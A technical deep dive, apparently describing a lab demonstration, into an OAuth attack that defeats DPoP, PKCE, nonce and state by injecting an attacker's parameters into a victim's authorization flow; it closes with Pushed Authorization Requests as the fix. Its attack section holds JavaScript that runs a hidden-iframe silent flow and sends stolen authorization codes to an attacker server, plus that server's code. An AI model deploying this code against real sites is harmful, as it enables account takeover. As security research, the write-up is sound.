# DPoP Attack - Technical Deep Dive

## Table of Contents
1. [OAuth/OIDC Parameter Generation](#oauthoidc-parameter-generation)
2. [ASP.NET Core OIDC Middleware Internals](#aspnet-core-oidc-middleware-internals)
3. [DPoP Implementation Details](#dpop-implementation-details)
4. [Attack Implementation](#attack-implementation)
5. [Why Each Security Mechanism Fails](#why-each-security-mechanism-fails)

---

## OAuth/OIDC Parameter Generation

### PKCE (Proof Key for Code Exchange)

#### Generation (Attacker's Browser)

When the attacker clicks "Start OAuth Flow", the ASP.NET Core OIDC middleware automatically generates PKCE parameters:

```csharp
// Inside OpenIdConnectHandler.HandleChallengeAsync()
if (Options.UsePkce)
{
    // Generate 32 random bytes
    var bytes = new byte[32];
    RandomNumberGenerator.Fill(bytes);
    
    // Base64Url encode to create code_verifier
    var codeVerifier = Base64UrlEncoder.Encode(bytes);
    
    // Store in authentication properties (encrypted in correlation cookie)
    properties.Items.Add(OidcConstants.CodeVerifierKey, codeVerifier);
    
    // Generate code_challenge = Base64Url(SHA256(code_verifier))
    using var sha256 = SHA256.Create();
    var challengeBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(codeVerifier));
    var codeChallenge = Base64UrlEncoder.Encode(challengeBytes);
    
    // Add to authorization request
    message.Parameters.Add(OidcConstants.CodeChallengeKey, codeChallenge);
    message.Parameters.Add(OidcConstants.CodeChallengeMethodKey, "S256");
}
```

#### Storage

The `code_verifier` is stored in the **correlation cookie**:

```
Set-Cookie: .AspNetCore.Correlation.oidc.{correlationId}={encrypted_properties}; 
  path=/signin-oidc; secure; httponly; samesite=none
```

The cookie contains:
- `code_verifier` (for token exchange)
- `state` (for CSRF protection)
- `nonce` (for ID token validation)
- `redirect_uri` (for validation)

#### Retrieval (Token Exchange)

When the authorization code is returned:

```csharp
// Inside OpenIdConnectHandler.HandleRemoteAuthenticateAsync()
// 1. Read correlation cookie
var properties = Options.StateDataFormat.Unprotect(correlationCookie);

// 2. Extract code_verifier
var codeVerifier = properties.Items[OidcConstants.CodeVerifierKey];

// 3. Include in token request
var tokenRequest = new Dictionary<string, string>
{
    { "grant_type", "authorization_code" },
    { "code", authorizationCode },
    { "redirect_uri", redirectUri },
    { "client_id", Options.ClientId },
    { "client_secret", Options.ClientSecret },
    { "code_verifier", codeVerifier }  // ← Retrieved from cookie
};
```

### Nonce Generation

#### Purpose
The nonce prevents replay attacks by binding the ID token to a specific authentication request.

#### Generation

```csharp
// Inside OpenIdConnectHandler.HandleChallengeAsync()
var nonce = Options.ProtocolValidator.GenerateNonce();
// Typically: DateTimeOffset.UtcNow.Ticks.ToString()

// Store in authentication properties
properties.Items.Add(OidcConstants.NonceKey, nonce);

// Add to authorization request
message.Parameters.Add(OidcConstants.NonceKey, nonce);
```

#### Validation

```csharp
// Inside OpenIdConnectHandler.HandleRemoteAuthenticateAsync()
// After receiving ID token

// 1. Extract nonce from correlation cookie
var expectedNonce = properties.Items[OidcConstants.NonceKey];

// 2. Extract nonce from ID token claims
var actualNonce = idToken.Claims.FirstOrDefault(c => c.Type == "nonce")?.Value;

// 3. Validate they match
if (expectedNonce != actualNonce)
{
    throw new OpenIdConnectProtocolInvalidNonceException(
        "IDX21320: RequireNonce is 'True'. Nonce validation failed.");
}
```

### State Parameter

#### Purpose
Prevents CSRF attacks by binding the callback to the original request.

#### Generation and Validation

```csharp
// Generation
var state = Options.StateDataFormat.Protect(properties);
message.State = state;

// Validation (on callback)
var properties = Options.StateDataFormat.Unprotect(returnedState);
if (properties == null)
{
    throw new InvalidOperationException("State validation failed");
}
```

---

## ASP.NET Core OIDC Middleware Internals

### Authorization Flow Sequence

```
1. User accesses protected resource
   ↓
2. AuthenticationMiddleware detects unauthenticated user
   ↓
3. Triggers Challenge (HTTP 401)
   ↓
4. OpenIdConnectHandler.HandleChallengeAsync()
   - Generates: state, nonce, code_verifier, code_challenge
   - Creates correlation cookie with encrypted properties
   - Builds authorization URL
   - Returns 302 redirect
   ↓
5. Browser redirected to Authorization Server
   ↓
6. User authenticates (if needed)
   ↓
7. Authorization Server redirects back to /signin-oidc?code=...&state=...
   ↓
8. OpenIdConnectHandler.HandleRemoteAuthenticateAsync()
   - Reads correlation cookie
   - Validates state parameter
   - Extracts code_verifier from cookie
   - Exchanges code for tokens (includes code_verifier)
   - Validates ID token (including nonce)
   - Deletes correlation cookie
   - Creates authentication cookie
   - Returns 302 redirect to original URL
```

### Correlation Cookie Lifecycle

#### Creation (Authorization Request)

```csharp
// In HandleChallengeAsync()
var properties = new AuthenticationProperties
{
    RedirectUri = redirectUri,
    Items =
    {
        { ".xsrf", correlationId },
        { OidcConstants.CodeVerifierKey, codeVerifier },
        { OidcConstants.NonceKey, nonce },
        // ... other properties
    }
};

var cookieOptions = new CookieOptions
{
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.None,
    Path = Options.CallbackPath,
    Expires = DateTimeOffset.UtcNow.AddMinutes(15)
};

var protectedData = Options.StateDataFormat.Protect(properties);
Response.Cookies.Append(
    $".AspNetCore.Correlation.{Options.SignInScheme}.{correlationId}",
    protectedData,
    cookieOptions
);
```

#### Consumption (Token Exchange)

```csharp
// In HandleRemoteAuthenticateAsync()
var correlationCookie = Request.Cookies[$".AspNetCore.Correlation.{Options.SignInScheme}.{correlationId}"];
var properties = Options.StateDataFormat.Unprotect(correlationCookie);

// Use properties for validation and token exchange
var codeVerifier = properties.Items[OidcConstants.CodeVerifierKey];
var expectedNonce = properties.Items[OidcConstants.NonceKey];

// Delete correlation cookie after use
Response.Cookies.Delete($".AspNetCore.Correlation.{Options.SignInScheme}.{correlationId}");
```

---

## DPoP Implementation Details

### DPoP Key Generation

```csharp
// In WebClient/Program.cs
var sharedRsaKey = new RsaSecurityKey(RSA.Create(2048));
var sharedJwk = JsonWebKeyConverter.ConvertFromSecurityKey(sharedRsaKey);
sharedJwk.Alg = "PS256";

DPoPProofGenerator.Initialize(sharedRsaKey, sharedJwk);
```

### DPoP Proof Structure

A DPoP proof is a JWT with:

**Header:**
```json
{
  "typ": "dpop+jwt",
  "alg": "PS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "xGOr-H7A-PWgPZ...",
    "alg": "PS256"
  }
}
```

**Payload:**
```json
{
  "jti": "unique-identifier",
  "htm": "POST",
  "htu": "https://localhost:5001/connect/token",
  "iat": 1699999999
}
```

### DPoP JKT (Thumbprint) Calculation

```csharp
// The dpop_jkt is the Base64Url-encoded SHA-256 hash of the JWK
public static string GetJwkThumbprint()
{
    return Base64UrlEncoder.Encode(_jwk.ComputeJwkThumbprint());
}

// ComputeJwkThumbprint() creates canonical JSON and hashes it:
// 1. Create canonical JWK (sorted keys, no whitespace)
// 2. UTF-8 encode
// 3. SHA-256 hash
// 4. Base64Url encode
```

### Authorization Request with DPoP

```
GET /connect/authorize?
  client_id=dpop&
  response_type=code&
  scope=openid profile&
  redirect_uri=https://localhost:5010/signin-oidc&
  state=CfDJ8...&
  code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&
  code_challenge_method=S256&
  nonce=638123456789&
  dpop_jkt=NzbLsXh8uDCcd-6MNwXF4W_7noWXFZAfHkxZsRGC9Xs  ← DPoP binding
```

### Token Exchange with DPoP

```http
POST /connect/token HTTP/1.1
Host: localhost:5001
Content-Type: application/x-www-form-urlencoded
DPoP: eyJ0eXAiOiJkcG9wK2p3dCIsImFsZyI6IlBTMjU2IiwiandrIjp7...

grant_type=authorization_code&
code=AUTH_CODE&
redirect_uri=https://localhost:5010/signin-oidc&
client_id=dpop&
client_secret=SECRET&
code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
```

The server validates:
1. DPoP proof signature matches JWK in header
2. JWK thumbprint matches `dpop_jkt` from authorization request
3. `htm` and `htu` in proof match the token endpoint
4. `code_verifier` matches `code_challenge` from authorization request

---

## Attack Implementation

### Attacker's JavaScript (Simplified)

```javascript
// 1. Initialize attack
class OAuthAttack {
    constructor() {
        this.sessionId = 'session_' + Math.random().toString(36).substring(7);
    }
    
    // 2. Capture parameters from URL
    captureParametersFromUrl() {
        const url = new URL(window.location.href);
        return {
            dpop_jkt: url.searchParams.get('dpop_jkt'),
            state: url.searchParams.get('state'),
            code_challenge: url.searchParams.get('code_challenge'),
            nonce: url.searchParams.get('nonce')
        };
    }
    
    // 3. Send to attacker API
    async sendToAttackerApi(params) {
        await fetch('https://localhost:7666/api/attack/dpop', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: this.sessionId,
                dpopProof: params.dpop_jkt,
                nonce: params.nonce,
                codeChallenge: params.code_challenge
            })
        });
    }
}
```

### Victim's JavaScript (Malicious)

```javascript
// 1. Poll for stolen parameters
async function pollForDpopJkt() {
    const response = await fetch('https://localhost:7666/api/attack/dpop/latest');
    if (response.ok) {
        const data = await response.json();
        stolenDpopJkt = data.dpopProof;
        stolenCodeChallenge = data.codeChallenge;
        stolenNonce = data.nonce;
        
        // 2. Start silent OAuth flow
        startSilentOAuthFlow();
    }
}

// 2. Silent authorization request
function startSilentOAuthFlow() {
    const authorizeUrl = new URL('https://localhost:5001/connect/authorize');
    authorizeUrl.searchParams.set('client_id', 'dpop');
    authorizeUrl.searchParams.set('redirect_uri', 'https://localhost:5010/signin-oidc');
    authorizeUrl.searchParams.set('response_type', 'code');
    authorizeUrl.searchParams.set('scope', 'openid profile scope1 offline_access');
    authorizeUrl.searchParams.set('response_mode', 'fragment');
    
    // Use stolen parameters
    authorizeUrl.searchParams.set('dpop_jkt', stolenDpopJkt);
    authorizeUrl.searchParams.set('code_challenge', stolenCodeChallenge);
    authorizeUrl.searchParams.set('code_challenge_method', 'S256');
    authorizeUrl.searchParams.set('nonce', stolenNonce);
    authorizeUrl.searchParams.set('state', 'malicious_state_' + Math.random());
    
    // Create hidden iframe
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = authorizeUrl.toString();
    document.body.appendChild(iframe);
}

// 3. Intercept authorization code
iframe.onload = function() {
    const iframeUrl = iframe.contentWindow.location.href;
    if (iframeUrl.includes('/signin-oidc') && iframeUrl.includes('#')) {
        const fragment = iframeUrl.split('#')[1];
        const params = new URLSearchParams(fragment);
        const code = params.get('code');
        
        // 4. Exfiltrate to attacker API
        fetch('https://localhost:7666/api/attack/code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: attackerSessionId,
                code: code,
                state: params.get('state')
            })
        });
    }
};
```

### Attacker API (Coordination Server)

```csharp
// Store stolen parameters
app.MapPost("/api/attack/dpop", (DPoPProofData data, AttackStorage storage) =>
{
    storage.StoreDPoPProof(data);
    return Results.Ok();
});

// Victim polls for parameters
app.MapGet("/api/attack/dpop/latest", (AttackStorage storage) =>
{
    var proof = storage.GetLatestDPoPProof();
    return proof != null ? Results.Ok(proof) : Results.NotFound();
});

// Victim sends stolen code
app.MapPost("/api/attack/code", (AuthCodeData data, AttackStorage storage) =>
{
    storage.StoreAuthCode(data);
    return Results.Ok();
});

// Attacker retrieves stolen code
app.MapGet("/api/attack/code/{sessionId}", (string sessionId, AttackStorage storage) =>
{
    var code = storage.GetAuthCode(sessionId);
    return code != null ? Results.Ok(code) : Results.NotFound();
});
```

---

## Why Each Security Mechanism Fails

### 1. DPoP (Demonstrating Proof of Possession)

**Purpose:** Bind tokens to a specific cryptographic key

**Why it fails:**
- DPoP successfully binds the tokens to the attacker's key
- The authorization code is issued with `dpop_jkt` = attacker's key thumbprint
- When the attacker exchanges the code, their DPoP proof matches perfectly
- **The problem:** DPoP doesn't verify WHO initiated the authorization request

**What DPoP validates:**
```
✓ DPoP proof signature is valid
✓ JWK in proof matches JWK thumbprint from authorization
✓ Token is bound to attacker's key
✗ Authorization was initiated by victim's browser (not checked)
```

### 2. PKCE (Proof Key for Code Exchange)

**Purpose:** Prevent authorization code interception attacks

**Why it fails:**
- PKCE assumes the same entity generates `code_challenge` and provides `code_verifier`
- In this attack:
  - Attacker generates `code_verifier` (stored in their correlation cookie)
  - Victim uses attacker's `code_challenge` in authorization request
  - Attacker provides matching `code_verifier` in token exchange
- **The problem:** PKCE doesn't prevent the authorization request from using a different party's challenge

**What PKCE validates:**
```
✓ code_verifier is provided in token exchange
✓ SHA256(code_verifier) == code_challenge from authorization
✗ Same browser made both requests (not checked)
```

### 3. Nonce (Replay Protection)

**Purpose:** Prevent ID token replay attacks

**Why it fails:**
- Nonce successfully prevents replay of ID tokens
- In this attack:
  - Attacker generates nonce (stored in their correlation cookie)
  - Victim uses attacker's nonce in authorization request
  - ID token contains the attacker's nonce
  - Attacker's browser expects this nonce
- **The problem:** Nonce doesn't prevent the authorization request from using a different party's nonce

**What nonce validates:**
```
✓ Nonce in ID token matches nonce in correlation cookie
✓ ID token was issued for this specific request
✗ Authorization request came from same browser (not checked)
```

### 4. State Parameter (CSRF Protection)

**Purpose:** Prevent cross-site request forgery

**Why it fails:**
- State successfully prevents CSRF attacks
- In this attack:
  - Attacker generates state (stored in their correlation cookie)
  - Attacker's callback includes their state
  - State validation passes
- **The problem:** State doesn't prevent authorization code theft

**What state validates:**
```
✓ Callback state matches state in correlation cookie
✓ Callback is for this specific OAuth flow
✗ Authorization code wasn't stolen (not checked)
```

### 5. TLS/HTTPS

**Purpose:** Encrypt communication, prevent man-in-the-middle

**Why it fails:**
- TLS successfully encrypts all communication
- **The problem:** Malicious JavaScript runs INSIDE the TLS-protected context
- The JavaScript has full access to:
  - Authorization requests (can read/modify parameters)
  - Authorization responses (can intercept codes)
  - Ability to make outbound requests to attacker's server

### Summary: The Fundamental Gap

All these mechanisms assume:
- The authorization request and token exchange come from the same entity
- JavaScript running in the browser is trusted
- Parameters in the authorization request represent the client's intent

The attack exploits the gap between:
- **Front-channel** (authorization): Victim's browser with attacker's parameters
- **Back-channel** (token exchange): Attacker's browser with matching credentials

**The authorization server cannot distinguish this from a legitimate flow** because all cryptographic bindings are correct.

---

## The Solution: Pushed Authorization Requests (PAR)

PAR prevents this attack by moving parameter submission to the back-channel:

```
Traditional Flow:
Browser → [params in URL] → Authorization Server

PAR Flow:
Client → [POST params via back-channel] → Authorization Server
         ← [request_uri]
Browser → [request_uri in URL] → Authorization Server
```

With PAR:
1. Client pushes parameters via authenticated back-channel
2. Authorization server returns a one-time `request_uri`
3. Browser only includes `request_uri` in authorization request
4. Malicious JavaScript cannot modify parameters (they're already committed)

This breaks the attack because the victim's browser cannot inject the attacker's `dpop_jkt`, `code_challenge`, or `nonce`.
